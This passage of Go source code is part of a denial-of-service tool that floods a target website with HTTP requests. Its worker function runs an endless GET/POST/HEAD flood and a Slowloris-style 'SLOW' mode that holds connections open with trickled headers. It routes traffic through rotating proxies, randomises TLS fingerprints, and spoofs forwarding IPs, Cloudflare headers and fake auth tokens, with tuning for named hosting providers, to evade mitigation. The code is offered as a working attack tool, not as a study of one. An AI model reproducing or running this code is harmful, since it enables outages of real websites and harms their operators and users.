				fmt.Printf("[+] Total requests/streams: %d\n", stats.get())
				fmt.Printf("[+] Current RPS: %.0f\n", rps)
				if useProxy && len(proxies) > 0 {
					fmt.Printf("[+] Active proxies: %d\n", len(proxies))
				}
				fmt.Println("Press Ctrl+C to stop early")
			}
		}
	}()

	wg.Wait()
}

func clearScreen() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

type atomicCounter struct {
	mu  sync.Mutex
	val int64
}

func (c *atomicCounter) inc() {
	c.mu.Lock()
	c.val++
	c.mu.Unlock()
}

func (c *atomicCounter) get() int64 {
	c.mu.Lock()
	v := c.val
	c.mu.Unlock()
	return v
}

func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCounter, useProxy bool) {
	var client *http.Client

	if useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				tr := &http.Transport{
					Proxy:               http.ProxyURL(proxyURL),
					TLSClientConfig:     getRandomTLSProfile(), // CHANGED: Use randomized TLS profile
					MaxIdleConns:        4000,
					MaxIdleConnsPerHost: 2000,
					IdleConnTimeout:     120 * time.Second,
					DisableKeepAlives:   false,
				}
				// Enable HTTP/2
				http2.ConfigureTransport(tr)
				client = &http.Client{Transport: tr, Timeout: 0}
			}
		}
	}

	if client == nil {
		tr := &http.Transport{
			TLSClientConfig:     getRandomTLSProfile(), // CHANGED: Use randomized TLS profile
			MaxIdleConns:        4000,
			MaxIdleConnsPerHost: 2000,
			IdleConnTimeout:     120 * time.Second,
			DisableKeepAlives:   false,
		}
		// Enable HTTP/2
		http2.ConfigureTransport(tr)
		client = &http.Client{Transport: tr, Timeout: 0}
	}

	for {
		select {
		case <-done:
			return
		default:
			var req *http.Request
			var err error

			path := generateAdvancedPath()

			if mode != "SLOW" && randInt(1, 100) <= 70 {
				if strings.Contains(path, "?") {
					path += "&" + generateCacheBustParams()[1:]
				} else {
					path += generateCacheBustParams()
				}
			}

			fullURL := target
			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
				fullURL += "/" + path
			} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
				fullURL = strings.TrimSuffix(target, "/") + path
			} else {
				fullURL += path
			}

			if mode == "SLOW" {
				conn, err := net.DialTimeout("tcp", host, 5*time.Second)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				defer conn.Close()

				conn.SetDeadline(time.Now().Add(300 * time.Second))

				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\n", path)
				fmt.Fprintf(conn, "Host: %s\r\n", host)
				fmt.Fprintf(conn, "User-Agent: %s\r\n", randomUA())
				fmt.Fprintf(conn, "Accept: text/html\r\n")
				fmt.Fprintf(conn, "Connection: keep-alive\r\n\r\n")

				go func(c net.Conn, doneChan chan struct{}) {
					ticker := time.NewTicker(time.Duration(randInt(4, 12)) * time.Second)
					defer ticker.Stop()

					for {
						select {
						case <-doneChan:
							return
						case <-ticker.C:
							fmt.Fprintf(c, "X-%s: %s\r\n", randomString(4), randomString(8))
							c.SetDeadline(time.Now().Add(300 * time.Second))
						}
					}
				}(conn, done)

				stats.inc()
				time.Sleep(1 * time.Second)
				continue
			}

			if mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if mode == "POST" {
				payload, contentType := generatePostPayload()
				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Set("Content-Type", contentType)
					req.ContentLength = int64(len(payload))
				}
			} else if mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			}

			if err != nil {
				continue
			}

			// ===== ENHANCED HEADER SPOOFING FROM PYTHON FILE =====
			
			// Basic headers
			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Connection", "keep-alive")
			
			// Accept headers
			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
			req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
			
			// Cache control
			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
			if randBool() {
				req.Header.Set("Pragma", "no-cache")
			}
			
			// Provider detection and spoofing
			provider := detectProvider(host)
			
			// Cloudflare headers
			if provider == "cloudflare" || randInt(1, 100) <= 40 {
				cfIP := generateCloudflareIP()
				numCF := randInt(2, 4)
				for i := 0; i < numCF; i++ {
					cfHeader := cloudflareHeaders[randInt(0, len(cloudflareHeaders)-1)]
					for k, v := range cfHeader {
						if v == "" {
							if k == "CF-Connecting-IP" || k == "True-Client-IP" {
								req.Header.Set(k, cfIP)
							} else {
								req.Header.Set(k, v)
							}
						} else {
							req.Header.Set(k, v)
						}
					}
				}
				req.Header.Set("X-Forwarded-For", cfIP)
				req.Header.Set("X-Real-IP", cfIP)
			}
			
			// Provider-specific headers
			if provider == "hetzner" && randBool() {
				for _, h := range hetznerHeaders {
					for k, v := range h {
						if v == "" {
							req.Header.Set(k, generateRandomIP())
						} else {
							req.Header.Set(k, v)
						}
					}
				}
			}
			
			if provider == "digitalocean" && randBool() {
				for _, h := range digitaloceanHeaders {
					for k, v := range h {
						if k == "X-Forwarded-Host" && v == "" {
							req.Header.Set(k, host)
						} else if k == "X-Forwarded-Port" {
							req.Header.Set(k, v)
						}
					}
				}
			}
			
			if provider == "aws" && randBool() {
				for _, h := range awsHeaders {
					for k, v := range h {
						if k == "X-Amz-Cf-Id" && v == "" {
							req.Header.Set(k, randomHex(16))
						} else {
							req.Header.Set(k, v)
						}
					}
				}
			}
			
			// Security headers
			numSecurity := randInt(1, 3)
			for i := 0; i < numSecurity; i++ {
				secHeader := securityHeaders[randInt(0, len(securityHeaders)-1)]
				for k, v := range secHeader {
					req.Header.Set(k, v)
				}
			}
			
			// Modern browser headers
			numModern := randInt(3, 6)
			usedModern := make(map[string]bool)
			for i := 0; i < numModern; i++ {
				modernHeader := modernHeaders[randInt(0, len(modernHeaders)-1)]
				for k, v := range modernHeader {
					if !usedModern[k] {
						req.Header.Set(k, v)
						usedModern[k] = true
					}
				}
			}
			
			// Application headers
			if randInt(1, 100) <= 60 {
				numApp := randInt(1, 3)
				for i := 0; i < numApp; i++ {
					appHeader := appHeaders[randInt(0, len(appHeaders)-1)]
					for k, v := range appHeader {
						if v == "" {
							switch k {
							case "X-CSRF-Token":
								req.Header.Set(k, randomBase64(32))
							case "Authorization":
								req.Header.Set(k, "Bearer "+randomBase64(48))
							case "X-API-Key":
								req.Header.Set(k, randomHex(16))
							case "X-Device-ID":
								req.Header.Set(k, generateUUID())
							case "X-Session-ID":
								req.Header.Set(k, randomHex(32))
							}
						} else {
							req.Header.Set(k, v)
						}
					}
				}
			}
			
			// CDN headers
			if randInt(1, 100) <= 30 {
				numCDN := randInt(1, 2)
				for i := 0; i < numCDN; i++ {
					cdnHeader := cdnHeaders[randInt(0, len(cdnHeaders)-1)]
					for k, v := range cdnHeader {
						req.Header.Set(k, v)
					}
				}
			}
			
			// Cookies
			if randInt(1, 100) <= 70 {
				cookies := generateCookies()
				if cookies != "" {
					req.Header.Set("Cookie", cookies)
				}
			}
			
			// Range header
			if randInt(1, 100) <= 15 {
				start := randInt(0, 1000)
				end := randInt(1001, 10000)
				req.Header.Set("Range", fmt.Sprintf("bytes=%d-%d", start, end))
			}
			
			// Upgrade-Insecure-Requests
			if randBool() {
				req.Header.Set("Upgrade-Insecure-Requests", "1")
			}
			
			// TE header
			if randBool() {
				teValues := []string{"trailers", "deflate", "gzip", "identity"}
				req.Header.Set("TE", teValues[randInt(0, len(teValues)-1)])
			}
			
			// Original X-Forwarded-For (if not set by provider)
			if req.Header.Get("X-Forwarded-For") == "" && randInt(1, 100) <= 30 {
				req.Header.Set("X-Forwarded-For", generateRandomIP())
			}

			resp, err := client.Do(req)
			if err == nil {
				if mode != "HEAD" {
					io.Copy(io.Discard, resp.Body)
				}
				resp.Body.Close()
			}

			stats.inc()
		}
	}
}

func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		randInt(1, 255),
		randInt(1, 255),
		randInt(1, 255),
		randInt(1, 255),
	)
}

func randomUA() string {
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(userAgents))))
	return userAgents[idx.Int64()]
}

func randomReferer() string {
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(referers))))
	return referers[idx.Int64()]
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}